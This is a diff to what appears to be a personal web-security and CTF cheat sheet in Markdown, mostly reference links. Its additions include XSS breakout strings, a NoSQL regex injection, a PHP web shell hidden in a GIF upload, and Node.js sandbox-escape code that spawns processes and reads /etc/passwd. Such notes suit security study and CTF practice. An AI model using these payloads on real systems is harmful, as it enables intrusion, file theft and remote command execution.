@@ -71,6 +71,12 @@ if _name__ == "__main__":
 
 # prototype pollution
 
+```javascript
+Object.prototype.outputFunctionName = 'x;<code>;x'
+```
+
+- [GitHub \- msrkp/PPScan: Client Side Prototype Pollution Scanner](https://github.com/msrkp/PPScan)
+- [GitHub \- BlackFan/client\-side\-prototype\-pollution: Prototype Pollution and useful Script Gadgets](https://github.com/BlackFan/client-side-prototype-pollution)
 - [GitHub \- Kirill89/prototype\-pollution\-explained: Prototype Pollution in JavaScript](https://github.com/Kirill89/prototype-pollution-explained)
     - [Prototype Pollution in lodash | Snyk](https://snyk.io/vuln/SNYK-JS-LODASH-73638)
         - https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf
@@ -117,6 +123,18 @@ RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
 
 # DOM clobbering
 
+- https://brutelogic.com.br/blog/filter-bypass-in-multi-context/
+    ```
+    // breakout from tag + js
+    ">'-alert(1)-'<svg>
+
+    // https://brutelogic.com.br/blog/the-easiest-way-to-bypass-xss-mitigations/
+    ">';alert(1);'<=svg>
+
+    // breakout from json
+    p="><!--
+    q=--><svg onload=alert(1)>
+    ```
 - https://xss.pwnfunction.com/challenges/ww3/
     - https://www.anquanke.com/post/id/197614
     - http://retanoj.github.io/2020/04/18/%E9%A2%98%E7%9B%AE-XSS-2020-04-18-XSS-game-of-pwnfunction-Challenges-WW3/
@@ -506,6 +524,13 @@ for i in xrange(1, 50):
 
 - https://medium.com/@gregIT/ringzer0team-ctf-sqli-challenges-part-2-b816ef9424cc
 
+# NoSQL Injection
+
+- MongoDB
+    - `columnFoo[$regex]=^.foo`
+- [GitHub \- codingo/NoSQLMap: Automated NoSQL database enumeration and web application exploitation tool\.](https://github.com/codingo/NoSQLMap)
+    - https://www.defcon.org/images/defcon-21/dc-21-presentations/Chow/DEFCON-21-Chow-Abusing-NoSQL-Databases.pdf
+
 # code injection
 
 On: state persisted as objects (e.g. cookie)
@@ -517,13 +542,6 @@ j:[{"id":1,"body":["foo'"]}]
     - https://github.com/saw-your-packet/ctfs/blob/master/DarkCTF/Write-ups.md#dusty-notes
         - https://artsploit.blogspot.com/2016/08/pprce2.html
 
-# deserialization
-
-- https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html
-- https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-608664
-- https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html
-- https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
-
 # command injection
 
 ```
@@ -533,6 +551,13 @@ filename="'$(sleep 5)'a.gif"
 - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
 - [#863956 \[extra-asciinema\] Command Injection via insecure command formatting](https://hackerone.com/reports/863956)
     - [Avoid\-Command\-Injection\-Node\.md · GitHub](https://gist.github.com/evilpacket/5a9655c752982faf7c4ec6450c1cbf1b)
+
+# deserialization
+
+- https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html
+- https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-608664
+- https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html
+- https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
 
 # Path Traversal / Local File Inclusion (LFI)
 
@@ -546,6 +571,20 @@ nginx:
     ```
     location ^~ /static => /static../foo
     ```
+
+# File Upload
+
+- multipart request
+    ```
+    Content-Disposition: form-data; name="upfile"; filename="foo.php.png"
+    Content-Type: image/gif
+
+    GIF89a;<?system($_GET['cmd']);?>
+    ```
+
+- https://book.hacktricks.xyz/pentesting-web/file-upload
+- https://d00mfist.gitbooks.io/ctf/content/bypass_image_upload.html
+- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
 
 # Side Channels
 
@@ -598,6 +637,41 @@ nginx:
     foo
     undefined
     ```
+- sandbox escape
+    - if: all objects inside VM context
+    - then:
+        - https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed
+        - throw and catch host exception
+        ```javascript
+        try {
+            this.process.removeListener();
+        }
+        catch (host_exception) {
+            console.log('host exception: ' + host_exception.toString());
+            host_constructor = host_exception.constructor.constructor;
+            host_process = host_constructor('return this')().process;
+            child_process = host_process.mainModule.require("child_process");
+            console.log(child_process.execSync("cat /etc/passwd").toString());
+        }
+        ```
+    - else: use `this`
+    - https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html
+    ```javascript
+    this.constructor.constructor('return this.process')().mainModule.require("child_process").execSync('cat * | grep CSR')
+    ```
+- alternative for `child_process`
+    - https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html
+    - https://github.com/nodejs/node/blob/master/lib/internal/child_process.js
+    ```javascript
+    this.proc_wrap = this.constructor.constructor('return this.process.binding')();
+    this.Process = this.proc_wrap('process_wrap').Process;
+    this.process = new Process();
+    this.env = this.constructor.constructor('return this.process.env')();
+    this.mproc  = this.constructor.constructor('return this.process')();
+    this.sot = this.constructor.constructor('return this.process.stdout')();
+    this.sin = this.constructor.constructor('return this.process.stdin')();
+    this.rc = process.spawn({file:'/home/guest/flag_reader',args:[],cwd:"/home/guest",windowsVerbatimArguments:false,detached:false,envPairs:this.env, stdio:[mproc.stdin, mproc.stdout, mproc.stderr]});
+    ```
 - Object.freeze() is shallow
     ```javascript
     Object.freeze(Math);
@@ -614,6 +688,17 @@ nginx:
     Content-Type: application/x-www-form-urlencoded;/json
     {"q":"' \u0075nion \u0073elect '1"}
     ```
+- url encoding, utf-8 translation levels
+    - https://www.cgisecurity.com/lib/URLEmbeddedAttacks.html
+    - given `\r\n` in url: http request splitting
+        - https://github.com/p4-team/ctf/tree/master/2019-11-14-dragon-finals/cat_flag
+        - ~/code/guides/ctf/p4-team-ctf/2019-11-14-dragon-finals/cat_flag/
+        ```
+        >>> a=sys.stdout.buffer.write(bytes(' '.join([bin(c)[2:].zfill(8) for c in b'\x0d\x0a']), 'latin-1'))
+        00001101 00001010
+        >>> a=sys.stdout.buffer.write(bytes(' '.join([bin(c)[2:].zfill(8) for c in b'\xe0\xb4\x8a']), 'latin-1'))
+        11100000 10110100 10001010
+        ```
 - HTTP Path Normalization, IDNA
     ```
     http://nginx：80/flag.php
@@ -646,10 +731,6 @@ nginx:
 ```javascript
 // == "Hello World!"
 /Hello W/.source+/ordl!/.source
-```
-
-```
-# lskjdf
 ```
 
 ```bash
